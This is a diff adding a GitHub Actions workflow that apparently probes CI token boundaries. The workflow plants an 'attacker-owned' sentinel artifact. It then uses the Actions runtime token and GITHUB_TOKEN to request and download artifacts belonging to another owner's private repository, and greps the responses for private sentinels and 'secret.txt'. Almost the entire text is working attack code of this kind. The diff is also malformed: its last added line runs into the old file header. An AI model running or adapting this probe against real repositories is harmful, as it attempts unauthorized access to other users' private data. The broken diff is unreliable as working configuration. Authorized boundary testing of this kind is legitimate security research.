@@ -1,4 +1,68 @@
-name: g01-foreign-artifact-runtime-probe
+name: g01-runtime-token-boundary-probe
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Create attacker-owned runtime artifact
+        run: |
+          mkdir -p own
+          printf '%s\n' 'G01_RUNTIME_SELF_SENTINEL_20260803_R7K2' > own/sentinel.txt
+      - name: Upload attacker-owned runtime artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: g01-runtime-self-20260803-r7k2
+          path: own/sentinel.txt
+      - name: Probe runtime and GitHub token consumers
+        env:
+          FOREIGN_OWNER: apexblkw-ow-2lt415yust
+          FOREIGN_REPO: g01-private-control-20260803
+          FOREIGN_RUN: '30854116091'
+          FOREIGN_ARTIFACT: '8871751823'
+        run: |
+          set +e
+          echo "runtime_url_host=$(printf '%s' "$ACTIONS_RUNTIME_URL" | sed 's#https://##;s#/.*##')"
+          echo "current_run=$GITHUB_RUN_ID"
+          echo "current_repo=$GITHUB_REPOSITORY"
+
+          for run in "$GITHUB_RUN_ID" "$FOREIGN_RUN"; do
+            body=$(mktemp)
+            url="$ACTIONS_RUNTIME_URL/_apis/pipelines/workflows/$run/artifacts?api-version=6.0-preview"
+            code=$(curl -sS -o "$body" -w '%{http_code}' -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$url")
+            echo "runtime_artifacts run=$run status=$code bytes=$(wc -c < "$body")"
+            grep -aoE 'G01_RUNTIME_SELF_SENTINEL|G01_PRIVATE_ARTIFACT_SENTINEL|8871751823|g01-runtime-self' "$body" | head -20 || true
+            rm -f "$body"
+          done
+
+          for path in \
+            "/_apis/pipelines/artifacts/$FOREIGN_ARTIFACT?api-version=6.0-preview" \
+            "/_apis/Artifacts/$FOREIGN_ARTIFACT" \
+            "/_apis/pipelines/workflows/$FOREIGN_RUN/artifacts/$FOREIGN_ARTIFACT?api-version=6.0-preview"; do
+            body=$(mktemp)
+            code=$(curl -sS -o "$body" -w '%{http_code}' -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RUNTIME_URL$path")
+            echo "runtime_foreign_path=$path status=$code bytes=$(wc -c < "$body")"
+            grep -aoE 'G01_PRIVATE_ARTIFACT_SENTINEL|8871751823|secret.txt|not found|forbidden' "$body" | head -20 || true
+            rm -f "$body"
+          done
+
+          body=$(mktemp)
+          url="https://api.github.com/repos/$GITHUB_REPOSITORY/actions/artifacts"
+          code=$(curl -sS -o "$body" -w '%{http_code}' -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $GITHUB_TOKEN" "$url")
+          echo "github_api_self_artifacts status=$code bytes=$(wc -c < "$body")"
+          grep -aoE 'g01-runtime-self-20260803-r7k2|G01_RUNTIME_SELF_SENTINEL|8871751823' "$body" | head -20 || true
+          rm -f "$body"
+
+          body=$(mktemp)
+          url="https://api.github.com/repos/$FOREIGN_OWNER/$FOREIGN_REPO/actions/artifacts/$FOREIGN_ARTIFACT/zip"
+          code=$(curl -sS -o "$body" -w '%{http_code}' -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $GITHUB_TOKEN" "$url")
+          echo "github_api_foreign_artifact status=$code bytes=$(wc -c < "$body")"
+          rm -f "$body"name: g01-foreign-artifact-runtime-probe
 
 on:
   workflow_dispatch:
